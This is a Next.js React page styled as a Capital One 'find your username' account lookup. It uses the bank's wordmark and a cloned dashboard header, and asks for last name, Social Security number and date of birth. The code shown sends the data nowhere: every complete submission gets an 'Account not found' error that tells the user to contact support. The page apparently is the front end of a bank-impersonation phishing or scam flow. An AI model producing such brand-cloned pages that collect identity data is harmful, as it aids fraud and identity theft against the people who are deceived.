"use client";

import Image from 'next/image';
import React, { useState } from 'react';
import { useRouter } from 'next/navigation';

export default function SignupPage() {
  const router = useRouter();
  
  const [lastName, setLastName] = useState('');
  const [ssn, setSsn] = useState('');
  const [dob, setDob] = useState('');
  const [showError, setShowError] = useState(false);

  const handleFindMe = (e) => {
    e.preventDefault();
    if (lastName && ssn && dob) { setShowError(true); }
  };

  return (
    <div className="min-h-screen bg-white font-sans text-gray-900 flex flex-col">
      
      {/* EXACT SAME STICKY HEADER FROM DASHBOARD */}
      <header className="sticky top-0 z-[100] w-full bg-white shadow-md border-b border-gray-200">
        <div className="max-w-[1400px] mx-auto px-4 md:px-6 py-3 flex justify-between items-center">
          <div className="flex items-center">
            <Image src="/capitalone-com-wordmark.png" alt="Logo" width={130} height={40} style={{ width: 'auto', height: '35px' }} className="object-contain" priority />
          </div>
          <div className="flex items-center space-x-6 text-sm text-gray-700">
            <div className="hidden md:flex items-center cursor-pointer hover:underline">
              <span className="text-lg mr-1">🇺🇸</span>
              <svg className="w-4 h-4 ml-1" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M19 9l-7 7-7-7"></path></svg>
            </div>
            <button onClick={() => router.push('/')} className="flex items-center font-bold text-gray-900 hover:underline">
              <svg className="w-5 h-5 mr-1 text-[#004879]" fill="currentColor" viewBox="0 0 24 24">
                <path fillRule="evenodd" d="M12 2a5 5 0 100 10 5 5 0 000-10zm-7 14a7 7 0 0114 0H5z" clipRule="evenodd" />
              </svg>
              Sign In
            </button>
          </div>
        </div>
      </header>

      <main className="max-w-2xl mx-auto w-full px-4 pt-12 pb-20 flex flex-col items-center flex-1">
        
        <div className="relative flex items-center justify-center w-20 h-20 bg-[#004879] rounded-full mb-6 shadow-sm">
          <svg className="w-10 h-10 text-white relative z-10" fill="none" stroke="currentColor" viewBox="0 0 24 24">
            <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2.5" d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z" />
          </svg>
          <div className="absolute inset-0 border-[6px] border-[#3177a3] rounded-full m-2"></div>
          <div className="absolute -top-1 left-4 w-1 h-3 bg-[#ffc72c] rotate-[-45deg] rounded-sm"></div>
          <div className="absolute top-2 -left-1 w-3 h-1 bg-[#ffc72c] rotate-[-45deg] rounded-sm"></div>
          <div className="absolute -top-3 left-1/2 transform -translate-x-1/2 w-1 h-3 bg-[#ffc72c] rounded-sm"></div>
        </div>

        <h1 className="text-[28px] md:text-[32px] font-normal text-gray-900 mb-4 text-center tracking-tight">
          First, let's find your username
        </h1>
        <p className="text-[15px] text-gray-900 text-center max-w-lg leading-relaxed mb-8">
          This information will help us locate your online account(s). If needed, you can update your password after account lookup.
        </p>

        <div className="w-full max-w-[420px]">
          {showError && (
            <div className="mb-6 p-4 bg-red-50 border border-red-200 text-[#c60f13] text-sm rounded flex items-start shadow-sm">
              <svg className="w-5 h-5 mr-3 flex-shrink-0 mt-0.5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z"></path>
              </svg>
              <div>
                <strong>Account not found.</strong><br/>
                We could not locate an account matching this information. Please contact support to create a new account or recover your details.
              </div>
            </div>
          )}

          <div className="border border-gray-300 rounded shadow-sm p-8 bg-white">
            <form onSubmit={handleFindMe} className="flex flex-col space-y-6">
              <div>
                <label className="block text-sm font-bold text-gray-900 mb-1">Last Name</label>
                <input 
                  type="text" value={lastName}
                  onChange={(e) => { setLastName(e.target.value); setShowError(false); }}
                  className="w-full border border-gray-400 rounded px-3 py-2.5 focus:outline-none focus:ring-1 focus:ring-[#0071ce] transition-colors bg-white text-gray-900" required
                />
              </div>
              <div>
                <label className="block text-sm font-bold text-gray-900 mb-1">Social Security Number</label>
                <input 
                  type="text" placeholder="000000000" maxLength={9} value={ssn}
                  onChange={(e) => { setSsn(e.target.value.replace(/\D/g, '')); setShowError(false); }}
                  className="w-full border border-gray-400 rounded px-3 py-2.5 font-mono text-sm placeholder-gray-400 focus:outline-none focus:ring-1 focus:ring-[#0071ce] transition-colors bg-white text-gray-900" required
                />
              </div>
              <div>
                <label className="block text-sm font-bold text-gray-900 mb-1">Date of Birth</label>
                <input 
                  type="text" placeholder="mm / dd / yyyy" value={dob}
                  onChange={(e) => { setDob(e.target.value); setShowError(false); }}
                  className="w-full border border-gray-400 rounded px-3 py-2.5 font-mono text-sm placeholder-gray-400 focus:outline-none focus:ring-1 focus:ring-[#0071ce] transition-colors bg-white text-gray-900" required
                />
              </div>
              <div className="pt-2">
                <button type="submit" className="w-full bg-[#0071ce] hover:bg-[#005a8f] text-white font-bold py-3 rounded text-[15px] transition-colors shadow-sm focus:outline-none">
                  Find Me
                </button>
              </div>
            </form>
          </div>
        </div>
      </main>
    </div>
  );
}